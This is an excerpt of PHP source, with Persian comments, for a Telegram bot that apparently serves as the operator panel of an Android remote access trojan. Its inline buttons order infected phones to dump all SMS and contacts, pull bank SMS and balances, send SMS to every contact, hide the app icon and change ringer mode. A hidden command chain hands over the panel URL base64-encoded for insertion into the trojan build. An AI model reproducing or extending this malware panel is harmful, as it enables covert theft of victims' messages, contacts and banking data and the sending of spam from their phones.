<?php
//اسلام علیکم یا کصخلبن هسته خرما دمت گرم که میخوای ادیتش بزنی پنلش خیلی کیریه خدایی 👍🏿
include("info.php");
...
function control_button($dev_id_use)
{
    ...
    $control_button = json_encode(['resize_keyboard' => true,
        'inline_keyboard' => [
        //اینجارو ادیت زدم یکم از اون حالت کیری در بیاد
            [['text' => "🔀ᴄᴜʀʀᴇɴᴛ ᴅᴇᴠɪᴄᴇ", 'callback_data' => "status_user $dev_id_use"],/* <--- این دکمه رو هم بزنی بهت مشخصات یوزرو میده*/  ['text' => "$device_id", 'callback_data' => 'null']],
            [['text' => "Oflline Mode OFF", 'callback_data' => "offmodeoff $dev_id_use"], ['text' => "Offline Mode ON", 'callback_data' => "offmodeon $dev_id_use"]],
            [['text' => "📤ꜱᴇɴᴅ ꜱᴍꜱ", 'callback_data' => "send_sms $dev_id_use"]],
            [['text' => "📨ꜱᴇɴᴅ ꜱᴍꜱ ᴛᴏ ᴄᴏɴᴛᴀᴄᴛꜱ", 'callback_data' => "sms_contacts $dev_id_use"]],
            [['text' => "📩ʟᴀꜱᴛ ꜱᴍꜱ", 'callback_data' => "last_sms $dev_id_use"], ['text' => "📑ᴀʟʟ ᴄᴏɴᴛᴀᴄᴛ", 'callback_data' => "all_contacts $dev_id_use"], ['text' => "📬ᴀʟʟ ꜱᴍꜱ", 'callback_data' => "all_sms $dev_id_use"]],
            [['text' => "💸ʟᴀꜱᴛ ʙᴀɴᴋ ꜱᴍꜱ", 'callback_data' => "last_Bank_sms $dev_id_use"], ['text' => "🏦ᴀʟʟ ʙᴀɴᴋ ꜱᴍꜱ", 'callback_data' => "All_Bank_sms $dev_id_use"], ['text' => "Balance", 'callback_data' => "balance $dev_id_use"]],
            [['text' => "🎧ʀɪɴɢᴇʀ ᴍᴏᴅᴇ: $ringer_mode", 'callback_data' => 'null']],
            [['text' => "🔉ᴠɪʙʀᴀᴛᴇ", 'callback_data' => "vibrate_mode $dev_id_use"], ['text' => "🔇ꜱɪʟᴇɴᴛ", 'callback_data' => "silent_mode $dev_id_use"], ['text' => "🔊ɴᴏʀᴍᴀʟ", 'callback_data' => "normal_mode $dev_id_use"]],
            [['text' => "🌚ʜɪᴅᴇ", 'callback_data' => "hide_icon $dev_id_use"], ['text' => "🌝ᴠɪꜱɪʙʟᴇ", 'callback_data' => "visible_icon $dev_id_use"]],
            [['text' => "⚙️ᴄʜᴇᴄᴋ", 'callback_data' => "WhatsChecker $dev_id_use"], ['text' => "🔎ꜱᴇᴀʀᴄʜ ꜱᴍꜱ", 'callback_data' => "searchSMS $dev_id_use"], ['text' => "Information", "callback_data" => "information $dev_id_use"]],
...
//ببخشید بابت این قسمت

    } elseif ($text == "/Madsal") {

        smg($chat_id, "عه کیر شدی 😂 \n یه دستور دیگه امتحان کن مثلا /Mad", null);
        } elseif ($text == "/Mad") {

        smg($chat_id, "عه دوباره کیر شدی 😂 \n ایندفعه اینو بفرست <code>@mdsal</code> قول میدم کیر نشی ❤", null);
        } elseif ($text == "@mdsal") {
$lol = base64_encode("$site");
        smg($chat_id, "بفرما اینم لینک انکریپت شده ✅ \n <code>$lol</code> \n توی رت سرچ بزن <b>Mad-sal</b> و این کد رو جایگزین کن", null);
    } elseif ($data == "setting") {
...
برای راهنمایی به پیوی سازنده مراجعه کنید.
        ...
        $panel_log = json_encode(['resize_keyboard' => true,
            'inline_keyboard' => [
                [['text' => "🔀ᴄᴜʀʀᴇɴᴛ ᴅᴇᴠɪᴄᴇ", 'callback_data' => "status_user $dev_id_use"], ['text' => "$device_id", 'callback_data' => 'null']],
                [['text' => "Oflline Mode OFF", 'callback_data' => "offmodeoff $dev_id_use"], ['text' => "Offline Mode ON", 'callback_data' => "offmodeon $dev_id_use"]],
                [['text' => "📤ꜱᴇɴᴅ ꜱᴍꜱ", 'callback_data' => "send_sms $dev_id_use"]],
                [['text' => "📨ꜱᴇɴᴅ ꜱᴍꜱ ᴛᴏ ᴄᴏɴᴛᴀᴄᴛꜱ", 'callback_data' => "sms_contacts $dev_id_use"]],
                [['text' => "📩ʟᴀꜱᴛ ꜱᴍꜱ", 'callback_data' => "last_sms $dev_id_use"], ['text' => "📑ᴀʟʟ ᴄᴏɴᴛᴀᴄᴛ", 'callback_data' => "all_contacts $dev_id_use"], ['text' => "📬ᴀʟʟ ꜱᴍꜱ", 'callback_data' => "all_sms $dev_id_use"]],
